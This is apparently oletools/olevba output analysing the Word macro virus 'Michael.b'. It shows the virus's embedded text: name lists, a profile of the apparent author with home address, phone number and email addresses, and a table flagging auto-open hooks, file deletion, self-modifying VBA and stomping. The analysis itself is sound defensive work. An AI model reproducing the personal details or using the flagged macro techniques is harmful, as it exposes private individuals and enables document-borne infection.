Frederick Vicent Tant
Rolando Moldez
Lilibeth Serencio
Gilberto Piliin
Michael Santiano
Michael Salamat
Michael Manuel Murillo
Michael Lucas
Joseph Taopo
Joseph Borja
Joseph Landicho
Giovanni Largo
Juvany Ponce
Alberto Cayanan
Ronald Batoon
Philip Miralles
Jay Manpreet
Aldwin Mapili
Virgilio So
Erlinda Sy
Philbert Pagaspas
Juanita Cataag
Mar Dojillo
Novelita Calimag
Verlin Samonte
Sir Bernabe Santa Maria
Alejandro Bais
Ma'am Grace Quitoriano
Sir Lucero
Ma'am Maderas
Sir Omar Ghazal
Sir Angelo Gillen
Ronald Batoon
Rolly Mendoza

--------------------
(Not My Character References)

President Joseph Estrada
Blas Ople
Franklin Drilon
Jose Ma. Sison
Jolina Magdangal
Kristin Hermosa
Aurora Halili

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Character2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Character2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Close
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Character2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'MultiPage1'" IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "None" IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Page1'" IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'Programmer\'s Profile\r\n\r\n         Real Mode Name:  Michael I. Buen \r\nProtected Mode Name: Mycklangelo "The Skulltor\\n" Buenarotti\r\n                     Birthday: November 5, 1976\r\n                     Address: Block 6 Lot 3 Hauskon Homes, Daang Amaya,          \r\n                                     Tanza Cavite City\r\n                 Telephone: (046) 505-17-39            \r\n          e-mail address: mycklangelo@yahoo.com;mcklangelo@hotmail.com\r\n         Group Affiliated: GRAMMERSoft, Elevated Ideas\r\n  Group Not Affiliated: AMACConda Group of Companies\r\n       Services Offered: Programming, Debugging      \r\nServices Not Offered: Hacking, Pest-Control\r\n            \r\n\r\nAbout Me:\r\n      I\'m not a virus programmer per se, I\'m just a dedicated programmer and a serious learner.\r\n\r\nMy Favorite Principle in Writing (Code):\r\n    "A book is finished not when nothing more can be added, but when nothing can be remove from it." -- Code Complete: Steve McConnell\r\n\r\nMy Interest and Activites:\r\n       Reading, Analyzing, Hacking, Reading, Analyzing, Reading, Reading, Analyzing, Hacking, Analyzing, Analyzing, Analyzing, Analyzing, (program halt)\r\n\r\nFavorite Quote:\r\n      "The cure for boredom is curiosity.  There is no cure for curiosity"\r\n\r\n\r\n*** ACNOWLEDGMENT ***\r\n\r\nI\'m thanking Byron for sharing his computer and ideas, book and time, I\'m using his computer every Saturday and Sunday just to write this program.  And to all GRAMMERSoft especially LIENQ, I know what the hell of hacking we are all doing but nevertheless it is still legitimate learning.  And to PC-Cillin, the anti-virus software that gave me a hint that events of Word and Excel can be hooked by naming your procedures with the name of the event.  And to Rivermaya, Eraserheads, Renz Verano who\'s continuing to write Original Pilipino Music that calms our soul.  And Since I haven\'t yet finished my Thesis and Automata, I\'ll consider this as my quick software project, so I\'ll have to thanks all those beta tester of this virus, you can send me you comment and ratings about my program.  And to Mark ( he\'s currently a freshman computer science at Adamson University ) my brother, sorry I haven\'t include your picture here, the program has grown too large already.  Kung nagkataon ang pangalan ng virus na ito ay "Mark My Word".\r\n\r\n\r\n-- "Be a Superlearner, Enroll at AMACConda Computer College"'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Byron2/i04/i06'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Character2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'(In No Particular Order Using \r\n Rnd (110) and Randomize )\r\n\r\nFranco Rayela\r\nRoger Macalino\r\nByron James C. Ngan\r\nOnel de Guzman\r\nSerafin Santos\r\nConrad Pena\r\nJerome Sison\r\nAlde Aceveda\r\nPhilip Mora\r\nRichard Canuto\r\nLeonides "Darren" Mendoza\r\nEmetrio "Jing" Austria\r\nIrving Ilagan\r\nChristian Ramirez\r\nEdwin & Erwin Quita\r\nJoana Alonso\r\nFrederick Vicent Tant\r\nRolando Moldez\r\nLilibeth Serencio\r\nGilberto Piliin\r\nMichael Santiano\r\nMichael Salamat\r\nMichael Manuel Murillo\r\nMichael Lucas\r\nJoseph Taopo\r\nJoseph Borja\r\nJoseph Landicho\r\nGiovanni Largo\r\nJuvany Ponce\r\nAlberto Cayanan\r\nRonald Batoon\r\nPhilip Miralles\r\nJay Manpreet\r\nAldwin Mapili\r\nVirgilio So\r\nErlinda Sy\r\nPhilbert Pagaspas\r\nJuanita Cataag\r\nMar Dojillo\r\nNovelita Calimag\r\nVerlin Samonte\r\nSir Bernabe Santa Maria\r\nAlejandro Bais\r\nMa\'am Grace Quitoriano\r\nSir Lucero\r\nMa\'am Maderas\r\nSir Omar Ghazal\r\nSir Angelo Gillen\r\nRonald Batoon\r\nRolly Mendoza\r\n\r\n--------------------\r\n(Not My Character References)\r\n\r\nPresident Joseph Estrada\r\nBlas Ople\r\nFranklin Drilon\r\nJose Ma. Sison\r\nJolina Magdangal\r\nKristin Hermosa\r\nAurora Halili\r\n'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Michael.b' - OLE stream: 'Macros/Character2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|environment         |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |desk.cpl            |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

